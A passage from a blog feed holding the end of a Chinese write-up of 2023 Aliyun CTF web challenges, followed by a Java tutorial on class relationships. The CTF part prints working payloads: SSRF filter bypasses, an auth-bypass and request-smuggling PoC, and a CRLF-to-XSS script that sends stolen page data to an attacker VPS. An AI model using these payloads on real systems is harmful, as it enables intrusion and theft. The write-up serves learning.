string">"Forbidden."</span><span class="token punctuation">,</span> <span class="token number">403</span>      <span class="token keyword">if</span> <span class="token keyword">not</span> request<span class="token punctuation">.</span>data<span class="token punctuation">:</span>          <span class="token keyword">return</span> <span class="token string">"parameter error"</span><span class="token punctuation">,</span> <span class="token number">400</span>      params <span class="token operator">=</span> json<span class="token punctuation">.</span>loads<span class="token punctuation">(</span>request<span class="token punctuation">.</span>data<span class="token punctuation">)</span>      <span class="token keyword">if</span> <span class="token string">"url"</span> <span class="token keyword">not</span> <span class="token keyword">in</span> params<span class="token punctuation">:</span>          <span class="token keyword">return</span> <span class="token string">"parameter error"</span><span class="token punctuation">,</span> <span class="token number">400</span>      <span class="token keyword">for</span> key <span class="token keyword">in</span> <span class="token punctuation">[</span><span class="token string">"files"</span><span class="token punctuation">,</span> <span class="token string">"proxies"</span><span class="token punctuation">,</span> <span class="token string">"hooks"</span><span class="token punctuation">,</span> <span class="token string">"cert"</span><span class="token punctuation">]</span><span class="token punctuation">:</span>          <span class="token keyword">if</span> key <span class="token keyword">in</span> params<span class="token punctuation">:</span>              <span class="token keyword">del</span> params<span class="token punctuation">[</span>key<span class="token punctuation">]</span>      params<span class="token punctuation">[</span><span class="token string">"stream"</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token boolean">True</span>      params<span class="token punctuation">[</span><span class="token string">"allow_redirects"</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token boolean">False</span>      params<span class="token punctuation">[</span><span class="token string">"timeout"</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">10</span>        <span class="token comment"># Security department demand us to fix ssrf vulnerability even this api can not be accessed by public, fine. :)  </span>    host <span class="token operator">=</span> urlparse<span class="token punctuation">(</span>params<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"url"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>hostname      <span class="token keyword">try</span><span class="token punctuation">:</span>          ip <span class="token operator">=</span> ip_address<span class="token punctuation">(</span>host<span class="token punctuation">)</span>      <span class="token keyword">except</span> ValueError<span class="token punctuation">:</span>          ip <span class="token operator">=</span> ip_address<span class="token punctuation">(</span>custom_gethostbyname<span class="token punctuation">(</span>host<span class="token punctuation">)</span><span class="token punctuation">)</span>      <span class="token keyword">if</span> <span class="token builtin">any</span><span class="token punctuation">(</span><span class="token punctuation">[</span>ip <span class="token keyword">in</span> nw <span class="token keyword">for</span> nw <span class="token keyword">in</span> private_networks<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">:</span>          <span class="token keyword">return</span> <span class="token string">"Forbidden."</span><span class="token punctuation">,</span> <span class="token number">403</span>            r <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token operator">**</span>params<span class="token punctuation">)</span>      <span class="token keyword">return</span> r<span class="token punctuation">.</span>raw<span class="token punctuation">.</span>_fp<span class="token punctuation">.</span>raw_resp      <span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">"/"</span><span class="token punctuation">)</span>  <span class="token keyword">def</span> index<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>      <span class="token keyword">return</span> get_file<span class="token punctuation">(</span>__file__<span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">" "</span><span class="token punctuation">,</span> <span class="token string">" "</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"\n"</span><span class="token punctuation">,</span> "  "<span class="token punctuation">)</span>      <span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>      app<span class="token punctuation">.</span>run<span class="token punctuation">(</span>host<span class="token operator">=</span><span class="token string">'0.0.0.0'</span><span class="token punctuation">,</span> port<span class="token operator">=</span><span class="token number">8001</span><span class="token punctuation">,</span> debug<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li>有一个 proxy 接口可以发起HTTP请求但是限制了来源 IP ，以及有 SSRF 检查。</li><li>根据响应头中的 <code>Via: kong/2.8.3</code> 可知代码部署在 Kong API 网关之后</li><li>源码注释中有一个内网的地址 <a class="link"   href="http://172.18.19.3:8000/admin/" >http://172.18.19.3:8000/admin/<i class="fas fa-external-link-alt"></i></a></li></ul><p>这个题目是肉眼可见的 SSRF，所以第一步应该是绕过 XFF。由于 python wsgi 中不区分请求头中的 <code>-</code> 和<code>_</code> ，所以可以用 <code>X_Forwarded_For: 127.0.0.1</code> 头来绕过 IP 限制。</p><p>Kong 转发的时候有两个 XFF 头，而且 X_F_F 在后面</p><pre class="line-numbers language-none"><code class="language-none">X-Forwarded-For: a.a.a.aX_Forwarded_For: 127.0.0.1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>第二步绕过SSRF检查也有两个解法，一个是使用 <a class="link"   href="https://www.rfc-editor.org/rfc/rfc4291.html" >IPv4-mapped IPv6 address<i class="fas fa-external-link-alt"></i></a> 来绕过：<code>http://[::FFFF:172.18.19.3]:8000/admin/</code>，另一个是利用 urllib 中的 urlparse 和 requests (urllib3) 中的 urlparse 解析不一致来绕过： <code>http://172.18.19.3:8000\@www.aliyun.com/../admin/</code></p><img src="/2023/04/26/2023-Aliyun-CTF-%E5%A4%8D%E7%8E%B0/proxySSRF.png" class=""><p>请求到 <a class="link"   href="http://172.18.19.3:8000/admin/" >http://172.18.19.3:8000/admin/<i class="fas fa-external-link-alt"></i></a> 之后可以发现是 Kong API 网关的管理接口，通过访问 <a class="link"   href="http://172.18.19.3:8000/admin/services" >http://172.18.19.3:8000/admin/services<i class="fas fa-external-link-alt"></i></a> 等管理接口可以收集到以下信息：</p><img src="/2023/04/26/2023-Aliyun-CTF-%E5%A4%8D%E7%8E%B0/services.png" class=""><ul><li><a class="link"   href="http://172.18.19.3:8000/admin/" >http://172.18.19.3:8000/admin/<i class="fas fa-external-link-alt"></i></a> 只能GET，无法对网关进行配置</li><li>有另外一个后端服务 <a class="link"   href="http://172.18.20.2/" >http://172.18.20.2/<i class="fas fa-external-link-alt"></i></a> ，（不同网段，无法直接访问）对应网关地址 <a class="link"   href="http://172.18.19.3:8000/api/" >http://172.18.19.3:8000/api/<i class="fas fa-external-link-alt"></i></a></li><li><a class="link"   href="http://172.18.19.3:8000/api/" >http://172.18.19.3:8000/api/<i class="fas fa-external-link-alt"></i></a> 接口需要鉴权，但是 consumer 使用非对称加密签名 jwt 。有一个例外的接口无需鉴权, <a class="link"   href="http://172.18.19.3:8000/api/login" >http://172.18.19.3:8000/api/login<i class="fas fa-external-link-alt"></i></a></li><li>Flag 在 <a class="link"   href="http://172.18.19.3:8000/api/flag" >http://172.18.19.3:8000/api/flag<i class="fas fa-external-link-alt"></i></a> 需要POST请求</li></ul><p>这里首先要用<code>/api/login/..;/flag</code>绕过鉴权，（login接口不需要登录，后端tomcat处理时会把<code>/..;/</code>当做<code>/../</code>，请求地址就变成了 &#x2F;flag ）。其次在请求头中加入<code>Transfer-Encoding: chunked</code>，使用请求走私，在GET请求中夹带一个POST请求获取到最终flag。最终PoC如下：</p><pre class="line-numbers language-payload" data-language="payload"><code class="language-payload">POST &#x2F;proxy HTTP&#x2F;1.1Host: 118.178.238.83:8000Accept-Encoding: gzip, deflateAccept: *&#x2F;*Accept-Language: en-US;q&#x3D;0.9,en;q&#x3D;0.8User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;111.0.5563.111 Safari&#x2F;537.36Connection: closeCache-Control: max-age&#x3D;0Content-Length: 217X-Forwarded_For: 127.0.0.1&#123;&quot;url&quot;: &quot;http:&#x2F;&#x2F;[::ffff:172.18.19.3]:8000&#x2F;api&#x2F;flag&quot;,&quot;headers&quot;: &#123;&quot;Transfer-Encoding&quot;: &quot;chunked&quot;&#125;,&quot;data&quot;: &quot;0\r\n\r\nPOST &#x2F;api&#x2F;login..;&#x2F;flag HTTP&#x2F;1.1\r\nHost: 118.178.238.83:8000\r\nAccept: *&#x2F;*\r\nUser-Agent: testua\r\n\r\n&quot;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><img src="/2023/04/26/2023-Aliyun-CTF-%E5%A4%8D%E7%8E%B0/flagssrf.png" class=""><h2 id="obisidian"><a href="#obisidian" class="headerlink" title="obisidian"></a>obisidian</h2><p>这个题目给的是一个二进制文件，其实后面发现这个二进制文件当中所能得到的信息非常少，所以其实也没什么用。</p><p>在经过黑盒探测之后其实可以基本确定这个一个 XSS&#x2F;CSRF 这种类型的题目，并且可以在题目里面看到存在 CSP 头</p><img src="/2023/04/26/2023-Aliyun-CTF-%E5%A4%8D%E7%8E%B0/csp.png" class=""><p>通过测试可以发现 rouille 所使用的版本</p><pre class="line-numbers language-none"><code class="language-none">tiny_http &#x3D; &#123; version &#x3D; &quot;0.12.0&quot;, default-features &#x3D; false &#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>在设置 Header 时存在 CRLF 注入，因此可以通过 CRLF 注入绕过 CSP，这是 WP 写的，那如果让我来思考，我怎么自己发现这个 CRLF 注入呢？</p><p>早在自己在学习 CRLF 注入的时候就知道有 burpsuite 自带的插件，我觉得从漏洞挖掘的效率来说这样子是最好的。</p><img src="/2023/04/26/2023-Aliyun-CTF-%E5%A4%8D%E7%8E%B0/findCRLF.png" class=""><p>既然这里存在 CRLF 注入，我们可以直接打了，构造 payload</p><pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;127.0.0.1:8000&#x2F;note&#x2F;123123A:B&lt;script&gt;alert(&#x2F;xss&#x2F;)&lt;&#x2F;script&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>构造是成功的</p><img src="/2023/04/26/2023-Aliyun-CTF-%E5%A4%8D%E7%8E%B0/CRLFSuccess.png" class=""><p>由此我们尝试去读 Set-Cookie，我觉得这里我应该是不太能构造出 payload，太菜了</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests<span class="token keyword">import</span> re<span class="token keyword">import</span> base64REMOTE_ADDR <span class="token operator">=</span> <span class="token string">"&lt;http://116.62.26.23:8000>"</span><span class="token keyword">from</span> <span class="token builtin">pow</span> <span class="token keyword">import</span> do_bruters <span class="token operator">=</span> requests<span class="token punctuation">.</span>Session<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">expMaker</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">:</span>    exp <span class="token operator">=</span> <span class="token string">"&lt;http://localhost:8000/note/>"</span>    exp <span class="token operator">+=</span> <span class="token string">"%0d%0aContent-Length:LENGTH%0d%0a%0d%0a"</span>    exp <span class="token operator">+=</span> <span class="token string">'&lt;script>eval(atob("'</span>    exp <span class="token operator">+=</span>base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span>x<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"/"</span><span class="token punctuation">,</span><span class="token string">"%2F"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"+"</span><span class="token punctuation">,</span><span class="token string">"%2B"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"="</span><span class="token punctuation">,</span><span class="token string">"%3D"</span><span class="token punctuation">)</span>    exp <span class="token operator">+=</span> <span class="token string">'"))&lt;%2Fscript>'</span>    exp <span class="token operator">=</span> exp<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"LENGTH"</span><span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>exp<span class="token punctuation">)</span><span class="token operator">-</span>exp<span class="token punctuation">.</span>index<span class="token punctuation">(</span><span class="token string">"LENGTH"</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> expexp <span class="token operator">=</span> expMaker<span class="token punctuation">(</span><span class="token triple-quoted-string string">'''fetch("/note/%0d%0aContent-Length:1120%0d%0a%0d%0aaaa").then(res "6res.text()).then(data "6 &#123;window.location.href=""%VPS/x/r4?data=" +encodeURIComponent(data)&#125;).catch(err "6 window.location.href=""%VPS/x/r4?data=" +encodeURIComponent(err))'''</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>exp<span class="token punctuation">)</span><span class="token comment"># 拿cookie去访问/blog 看到admin发的⼀个note</span><span class="token keyword">def</span> <span class="token function">attack</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    rs<span class="token punctuation">.</span>post<span class="token punctuation">(</span>REMOTE_ADDR <span class="token operator">+</span> <span class="token string">"/login"</span><span class="token punctuation">,</span> data<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token string">"username"</span><span class="token punctuation">:</span> <span class="token string">"123"</span><span class="token punctuation">,</span> <span class="token string">"password"</span><span class="token punctuation">:</span> <span class="token string">"123"</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>    page <span class="token operator">=</span> rs<span class="token punctuation">.</span>get<span class="token punctuation">(</span>REMOTE_ADDR <span class="token operator">+</span> <span class="token string">"/submit"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>text    regex1 <span class="token operator">=</span> <span class="token string">r'&lt;label>([a-zA-Z0-9]&#123;1,&#125;)\\s*\\+\\s*4 chars\\(a-zA-Z0-9\\) = ([a-zA-Z0-9]&#123;32&#125;)"8label>'</span><span class="token comment"># regex1 = r'&lt;label>([a-zA-Z0-9]&#123;1,&#125;)\\s*\\+\\s*5 chars = ([a-zA-Z0-9]&#123;32&#125;)"8label>'</span>    data <span class="token operator">=</span> re<span class="token punctuation">.</span>findall<span class="token punctuation">(</span>regex1<span class="token punctuation">,</span> page<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span>    <span class="token builtin">pow</span> <span class="token operator">=</span> do_brute<span class="token punctuation">(</span>data<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span>data<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">pow</span><span class="token punctuation">)</span>    resp <span class="token operator">=</span> rs<span class="token punctuation">.</span>post<span class="token punctuation">(</span>REMOTE_ADDR <span class="token operator">+</span> <span class="token string">"/submit"</span><span class="token punctuation">,</span> data<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token string">"suffix"</span><span class="token punctuation">:</span> <span class="token builtin">pow</span><span class="token punctuation">,</span><span class="token string">"url"</span><span class="token punctuation">:</span>exp<span class="token punctuation">&#125;</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>resp<span class="token punctuation">.</span>status_code<span class="token punctuation">)</span>attack<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><img src="/2023/04/26/2023-Aliyun-CTF-%E5%A4%8D%E7%8E%B0/flagObi.png" class=""><h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>感觉题目质量真的很高，给我的感觉是考的很深入，这才是安全研究啊（仰天</p><p>且本次出题都很贴近开发情况，比如</p><ul><li>如何从一个 CRLF 注入 ——&gt; XSS</li><li>如何利用一些很常见的差异构造攻击，像 Tomcat 解析问题</li><li>如何在 SSRF 之后进行有效的信息收集</li></ul><p>等等……</p><p>题目质量真的很高，还有一部分题目没有复现是因为我觉得我现在的水平单纯跟着 WP 去看没什么意义。</p><h2 id="Ref"><a href="#Ref" class="headerlink" title="Ref"></a>Ref</h2><p><a class="link"   href="https://xz.aliyun.com/t/12485" >https://xz.aliyun.com/t/12485<i class="fas fa-external-link-alt"></i></a><br>Straw Hat WP</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;2023 Aliyun CTF 复现&lt;/p&gt;</summary>
    
    
    
    <category term="WP" scheme="https://drun1baby.github.io/categories/WP/"/>
    
    
    <category term="WP" scheme="https://drun1baby.github.io/tags/WP/"/>
    
  </entry>
  
  <entry>
    <title>红日靶场（二）</title>
    <link href="https://drun1baby.github.io/2023/04/22/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%EF%BC%88%E4%BA%8C%EF%BC%89/"/>
    <id>https://drun1baby.github.io/2023/04/22/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%EF%BC%88%E4%BA%8C%EF%BC%89/</id>
    <published>2023-04-22T10:04:29.000Z</published>
    <updated>2023-04-22T10:07:26.241Z</updated>
    
    
    
    
    <category term="内网" scheme="https://drun1baby.github.io/categories/%E5%86%85%E7%BD%91/"/>
    
    
    <category term="内网" scheme="https://drun1baby.github.io/tags/%E5%86%85%E7%BD%91/"/>
    
  </entry>
  
  <entry>
    <title>Java 设计模式之六大关系</title>
    <link href="https://drun1baby.github.io/2023/04/20/Java-%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F%E4%B9%8B%E5%85%AD%E5%A4%A7%E5%85%B3%E7%B3%BB/"/>
    <id>https://drun1baby.github.io/2023/04/20/Java-%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F%E4%B9%8B%E5%85%AD%E5%A4%A7%E5%85%B3%E7%B3%BB/</id>
    <published>2023-04-20T13:57:41.000Z</published>
    <updated>2023-04-20T13:59:41.110Z</updated>
    
    <content type="html"><![CDATA[<p>Java 设计模式之六大关系</p><span id="more"></span><h1 id="Java-设计模式之六大关系"><a href="#Java-设计模式之六大关系" class="headerlink" title="Java 设计模式之六大关系"></a>Java 设计模式之六大关系</h1><p>类之间的关系有：<strong>依赖、泛化、实现、关联、聚合、组合</strong>。</p><h2 id="类图的六大关系"><a href="#类图的六大关系" class="headerlink" title="类图的六大关系"></a>类图的六大关系</h2><h3 id="依赖"><a href="#依赖" class="headerlink" title="依赖"></a>依赖</h3><p>依赖关系是指类中用到了对方。可以是“类的成员属性”、“方法的返回类型”、“方法接收的参数类型”和“方法中使用到的类”。<br>对应的类图：</p><img src="/2023/04/20/Java-%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F%E4%B9%8B%E5%85%AD%E5%A4%A7%E5%85%B3%E7%B3%BB/dependency.png" class=""><p>对应代码</p><p><strong>PersonServiceBean.java</strong></p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">dependency</span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">PersonServiceBean</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">private</span> <span class="token class-name">PersonDao</span> personDao<span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">save</span><span class="token punctuation">(</span><span class="token class-name">Person</span> person<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token class-name">IDCard</span> <span class="token function">getIDCare</span><span class="token punctuation">(</span><span class="token class-name">Integer</span> personid<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token keyword">null</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">modify</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">Department</span> department <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Department</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>Department.java</strong></p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Department</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><strong>IDCard.java</strong></p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">IDCard</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><strong>Person.java</strong></p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Person</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><strong>PersonDao.java</strong></p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">PersonDao</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="泛化"><a href="#泛化" class="headerlink" title="泛化"></a>泛化</h3><p>泛化关系实际上就是继承关系，是依赖关系的特例。</p><p>对应的类图：</p><img src="/2023/04/20/Java-%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F%E4%B9%8B%E5%85%AD%E5%A4%A7%E5%85%B3%E7%B3%BB/generalization.png" class=""><p><strong>DaoSupport.java</strong></p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">abstract</span> <span class="token keyword">class</span> <span class="token class-name">DaoSupport</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">save</span><span class="token punctuation">(</span><span class="token class-name">Object</span> entity<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">delete</span><span class="token punctuation">(</span><span class="token class-name">Object</span> id<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>generalizationExample.java</strong></p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">generalization</span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> generalizationExample <span class="token keyword">extends</span> <span class="token class-name">DaoSupport</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h3 id="实现"><a href="#实现" class="headerlink" title="实现"></a>实现</h3><p>实现关系实际上就是A类实现B类的接口，是依赖关系的特例。</p><p>类图如下：</p><img src="/2023/04/20/Java-%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F%E4%B9%8B%E5%85%AD%E5%A4%A7%E5%85%B3%E7%B3%BB/achieve.png" class=""><p><strong>AchieveService.java</strong></p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token class-name">AchieveMent</span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">interface</span> <span class="token class-name">AchieveService</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">delete</span><span class="token punctuation">(</span><span class="token class-name">Integer</span> id<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>AchieveServiceImpl.java</strong></p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token class-name">AchieveMent</span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">AchieveServiceImpl</span> <span class="token keyword">implements</span> <span class="token class-name">AchieveService</span> <span class="token punctuation">&#123;</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">delete</span><span class="token punctuation">(</span><span class="token class-name">Integer</span> id<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token comment">// TODO Auto-generated method stub</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"delete.."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="关联"><a href="#关联" class="headerlink" title="关联"></a>关联</h3><p>关联关系实际上就是类与类之间的关系，是依赖关系的特例。</p><p>关联具有导航性：即双向关系或单向关系。</p><p>关联具有多重性：如“1”（表示有且仅有一个），“0…”（表示0个或多个），“0，1”（表示0个或1个），“n…m”（表示n到m个都可以）。</p><img src="/2023/04/20/Java-%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F%E4%B9%8B%E5%85%AD%E5%A4%A7%E5%85%B3%E7%B3%BB/associate.png" class=""><p>单向一对一关系：</p><p><strong>Person.java</strong></p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">associate</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">associate<span class="token punctuation">.</span></span><span class="token class-name">IDCard</span></span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Person</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">private</span> <span class="token class-name">IDCard</span> card<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>IDCard.java</strong></p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">associate</span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">IDCard</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>双向一对一关系：</p><p>说白了就是互相都调用了彼此</p><p><strong>Person.java</strong></p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">associate</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">associate<span class="token punctuation">.</span></span><span class="token class-name">IDCard</span></span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Person</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">private</span> <span class="token class-name">IDCard</span> card<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>IDCard.java</strong></p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">associate</span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">IDCard</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">private</span> <span class="token class-name">Person</span> person<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="聚合"><a href="#聚合" 